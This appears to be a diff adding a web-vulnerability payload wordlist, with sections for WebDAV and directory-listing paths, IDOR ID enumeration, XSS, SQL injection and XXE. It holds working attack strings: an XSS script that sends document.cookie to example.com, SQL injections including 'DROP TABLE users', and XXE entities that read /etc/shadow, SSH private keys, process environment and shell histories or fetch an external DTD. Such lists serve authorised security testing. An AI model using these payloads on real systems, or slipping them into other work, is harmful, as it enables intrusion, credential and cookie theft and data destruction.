@@ -1,0 +1,224 @@
+# WebDav
+/webdav/
+/dav/
+/data/
+/files/
+/webdisk/
+/webdavserver/
+/uploads/
+/documents/
+/assets/
+/private/
+/fileserver/
+/backup/
+/archive/
+/config/
+/download/
+/admin/
+/backup/
+/webdata/
+/static/
+/images/
+/resources/
+/media/
+/attachments/
+/doc/
+/public/
+/tmp/
+/log/
+/temp/
+/private/
+/sandbox/
+/conf/
+/adminpanel/
+/filemanager/
+/web/
+/path/
+/docs/
+/settings/
+/private_files/
+/userfiles/
+/fileuploads/
+/secure/
+/metadata/
+/datafiles/
+/downloads/
+/shared/
+
+# XSS
+"><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><img src=x onerror=alert(document.cookie)>
+"><svg onload=alert(document.cookie)>
+"><a href="javascript:alert(1)">Click me</a>
+"><body onload=alert(1)>
+"><iframe src="javascript:alert(1)"></iframe>
+"><style>@import 'javascript:alert(1)';</style>
+"><input type="text" onfocus="alert(1)">
+"><button onclick="alert(1)">Click me</button>
+"><form action="javascript:alert(1)">
+"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+"><object data="javascript:alert(1)"></object>
+"><embed src="javascript:alert(1)"></embed>
+"><script src="javascript:alert(1)"></script>
+"><base href="javascript:alert(1)">
+"><audio src="javascript:alert(1)"></audio>
+"><video src="javascript:alert(1)"></video>
+"><link href="javascript:alert(1)" rel="stylesheet">
+"><marquee behavior="alternate" onstart="alert(1)">Text</marquee>
+"><b onclick="alert(1)">Bold</b>
+"><h1 onmouseover="alert(1)">Header</h1>
+"><div onmouseover="alert(1)">Div</div>
+"><textarea onfocus="alert(1)">TextArea</textarea>
+"><select onchange="alert(1)"><option>Option</option></select>
+"><p onmouseover="alert(1)">Paragraph</p>
+"><form action="javascript:alert(1)" method="POST">Submit</form>
+"><script>document.write('<img src=x onerror=alert(1)>')</script>
+"><script>fetch('http://example.com?cookie=' + document.cookie)</script>
+"><script>eval('alert(1)')</script>
+"><script>setTimeout(() => alert(1), 0)</script>
+"><script>document.location='javascript:alert(1)'</script>
+
+# SQL Injection
+' OR '1'='1
+' OR '1'='1' -- 
+' AND 1=1 --
+' UNION SELECT NULL, NULL, NULL --
+' SELECT * FROM users WHERE username = '' OR '1'='1
+' DROP TABLE users; --
+' SELECT * FROM products WHERE id = '' OR '1'='1
+' AND 1=2 UNION SELECT NULL, NULL, NULL --
+' OR 'a'='a
+' UNION ALL SELECT 1, @@version, 3 --
+' UNION SELECT username, password FROM users --
+' UNION SELECT null, null, null --
+' OR 'x'='x' --
+' UNION SELECT NULL, NULL, NULL --
+' AND 1=1 UNION SELECT NULL, NULL --
+' OR 'a'='b' UNION SELECT null, null, null --
+' OR 1=1# --
+' AND 1=1--
+' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --
+' UNION SELECT null, database() --
+' UNION SELECT 1,2,3 --
+' OR 'x'='y' --
+' UNION SELECT NULL, NULL, NULL, NULL --
+' AND 1=1 --
+' AND 1=1 UNION SELECT NULL, NULL --
+' OR 'a'='b' UNION SELECT null, null, null --
+' OR 1=1# --
+' OR '1'='1' -- 
+' OR 1=1 LIMIT 1 --
+
+# IDOR
+/user?id=1
+/user?id=2
+/user?id=3
+/user?id=4
+/user?id=5
+/user?id=10
+/user?id=15
+/user?id=20
+/user?id=25
+/user?id=30
+/order?id=1
+/order?id=2
+/order?id=3
+/order?id=4
+/order?id=5
+/order?id=10
+/order?id=15
+/order?id=20
+/order?id=25
+/order?id=30
+/product?id=1
+/product?id=2
+/product?id=3
+/product?id=4
+/product?id=5
+/product?id=10
+/product?id=15
+/product?id=20
+/product?id=25
+/product?id=30
+/invoice?id=1
+/invoice?id=2
+/invoice?id=3
+/invoice?id=4
+/invoice?id=5
+/invoice?id=10
+/invoice?id=15
+/invoice?id=20
+/invoice?id=25
+/invoice?id=30
+
+# XXE
+<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8000/malicious.dtd"> ]><foo>&xxe;</foo>
+<?xml version="1.0" ?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://example.com/malicious.dtd"> ]><foo>&xxe;</foo>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://internal-service:8080"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file://C:/Windows/System32/drivers/etc/hosts"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///var/log/syslog"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///root/.bash_history"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///root/.mysql_history"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/group"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///var/log/auth.log"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///var/log/mysql/mysql.log"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/my.cnf"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///root/.gitconfig"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///home/user/.bashrc"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/ld.so.preload"> ]><root>&xxe;</root>
+<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/ssl/private/ssl-cert-snakeoil.key"> ]><root>&xxe;</root>
+
+# Index Of
+/
+/index.php
+/files/
+/docs/
+/images/
+/uploads/
+/media/
+/private/
+/public/
+/static/
+/assets/
+/downloads/
+/admin/
+/config/
+/logs/
+/tmp/
+/backup/
+/scripts/
+/resources/
+/data/
+/temp/
+/settings/
+/fileserver/
+/web/
+/uploads/
+/secure/
+/private_files/
+/shared/
+/webdata/
+/attachments/
+/tmp/
+/uploads/
+/documents/
+/userfiles/
+/private/
+/archive/
+/media/
+/static/
+/resources/
+/public/
+/docs/
+/assets/
+/files/
+/config/
+/private/
